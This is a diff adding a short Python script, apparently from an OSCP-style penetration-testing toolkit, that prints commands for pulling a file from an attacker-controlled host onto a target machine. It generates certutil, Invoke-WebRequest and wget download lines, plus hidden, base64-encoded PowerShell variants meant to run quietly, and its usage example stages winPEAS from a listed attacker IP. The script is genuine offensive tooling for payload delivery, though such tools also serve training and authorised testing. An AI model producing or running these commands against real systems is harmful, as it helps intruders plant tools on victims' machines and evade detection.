@@ -1,0 +1,36 @@
+#!/usr/bin/env python3
+
+# Created: Miharada (Tiwa Ramdhani) -> https://github.com/Miharada/MyOSCPTools/blob/main/TransferFileGenerator.py
+# slight modifications to suit my needs
+
+import sys
+import base64
+
+if len(sys.argv) != 5:
+    print("Usage: tf_generate <command> <file> <outputPath> <LHOST_PORT>")
+    print(r'Ex: tf_generate certutil winPEASx64.exe "C:\Users\Public\winpeas.exe" "192.168.45.1:8000"')
+    print("\nAvailable commands:")
+    print("  certutil   - Windows certutil to download a file")
+    print("  iwr        - Invoke-WebRequest to download a file via PowerShell")
+    print("  wget       - wget to download a file on Linux")
+    sys.exit(1)
+
+command = sys.argv[1]
+myfile = sys.argv[2]
+outpath = sys.argv[3]
+lhost_port = sys.argv[4]
+
+if command == "certutil":
+    print(f"certutil -urlcache -split -f http://{lhost_port}/{myfile} {outpath}")
+
+elif command == "iwr":
+    payload = f"iwr -Uri http://{lhost_port}/{myfile} -Outfile {outpath}"
+    print(f"iwr -Uri http://{lhost_port}/{myfile} -Outfile {outpath}")
+    print(f"powershell -c \"iwr -Uri http://{lhost_port}/{myfile} -Outfile {outpath}\"")
+    print(f"powershell -nop -w hidden -e {base64.b64encode(payload.encode('utf16')[2:]).decode()}")
+
+elif command == "wget":
+    payload = f"wget http://{lhost_port}/{myfile} -O {outpath}"
+    print(f"wget http://{lhost_port}/{myfile} -O {outpath}")
+    print(f"powershell -c \"wget http://{lhost_port}/{myfile} -O {outpath}\"")
+    print(f"powershell -nop -w hidden -e {base64.b64encode(payload.encode('utf16')[2:]).decode()}")
